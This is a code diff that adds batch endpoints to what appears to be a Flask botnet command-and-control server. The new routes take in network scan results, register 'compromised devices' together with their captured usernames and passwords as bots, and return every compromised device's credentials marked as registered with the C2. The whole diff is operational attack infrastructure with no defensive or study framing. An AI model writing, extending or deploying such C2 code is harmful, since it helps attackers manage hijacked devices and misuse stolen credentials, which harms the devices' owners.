@@ -497,6 +497,131 @@ def get_active_attacks():
         logging.error(f"Error retrieving active attacks: {e}")
         return jsonify({'error': str(e)}), 500
 
+@app.route('/batch-add-scan-results', methods=['POST'])
+def batch_add_scan_results():
+    """Efficiently add multiple scan results in a single operation"""
+    try:
+        data = request.get_json()
+        scan_results = data.get('scan_results', [])
+        
+        if not scan_results:
+            return jsonify({'error': 'No scan results provided'}), 400
+        
+        # Batch insert scan results
+        success_count = 0
+        for result in scan_results:
+            try:
+                db_manager.add_scan_result(
+                    result.get('ip'),
+                    result.get('port'),
+                    result.get('service', 'unknown')
+                )
+                success_count += 1
+            except Exception as e:
+                logging.warning(f"Failed to add scan result for {result.get('ip')}: {e}")
+        
+        logging.info(f"Batch added {success_count}/{len(scan_results)} scan results")
+        
+        return jsonify({
+            'status': 'success',
+            'total_received': len(scan_results),
+            'successful_count': success_count,
+            'failed_count': len(scan_results) - success_count
+        })
+        
+    except Exception as e:
+        logging.error(f"Error in batch scan result upload: {e}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/batch-register-devices', methods=['POST'])
+def batch_register_devices():
+    """Efficiently register multiple compromised devices in a single operation"""
+    try:
+        data = request.get_json()
+        devices = data.get('devices', [])
+        
+        if not devices:
+            return jsonify({'error': 'No devices provided'}), 400
+        
+        # Batch register devices
+        success_count = 0
+        failed_devices = []
+        
+        for device in devices:
+            try:
+                # Register the device
+                db_manager.add_bot(
+                    device.get('ip'),
+                    device.get('username'),
+                    device.get('password'),
+                    device.get('device_type', 'unknown')
+                )
+                success_count += 1
+                logging.info(f"Batch registered device {device.get('ip')}")
+                
+            except Exception as e:
+                failed_devices.append({
+                    'ip': device.get('ip'),
+                    'error': str(e)
+                })
+                logging.warning(f"Failed to register device {device.get('ip')}: {e}")
+        
+        logging.info(f"Batch registered {success_count}/{len(devices)} devices")
+        
+        return jsonify({
+            'status': 'success',
+            'total_received': len(devices),
+            'successful_count': success_count,
+            'failed_count': len(failed_devices),
+            'failed_devices': failed_devices
+        })
+        
+    except Exception as e:
+        logging.error(f"Error in batch device registration: {e}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/get-all-data', methods=['GET'])
+def get_all_data():
+    """Efficiently retrieve all scan results and device data in a single request"""
+    try:
+        # Get all data in one operation
+        scan_results = db_manager.get_latest_scan_results()
+        devices = db_manager.get_all_devices()
+        
+        # Format scan results
+        formatted_scan_results = []
+        for result in scan_results:
+            formatted_scan_results.append({
+                'ip': result[1],
+                'port': result[2],
+                'service': result[3],
+                'timestamp': result[4]
+            })
+        
+        # Format device data
+        formatted_devices = []
+        for device in devices:
+            formatted_devices.append({
+                'ip': device[1],
+                'username': device[2],
+                'password': device[3],
+                'device_type': device[4],
+                'status': device[5],
+                'last_seen': device[6],
+                'registered_c2': True  # All devices in DB are registered
+            })
+        
+        return jsonify({
+            'status': 'success',
+            'scan_results': formatted_scan_results,
+            'compromised_devices': formatted_devices,
+            'timestamp': datetime.now().isoformat()
+        })
+        
+    except Exception as e:
+        logging.error(f"Error retrieving all data: {e}")
+        return jsonify({'error': str(e)}), 500
+
 @app.errorhandler(404)
 def page_not_found(e):
     """Handle 404 errors"""
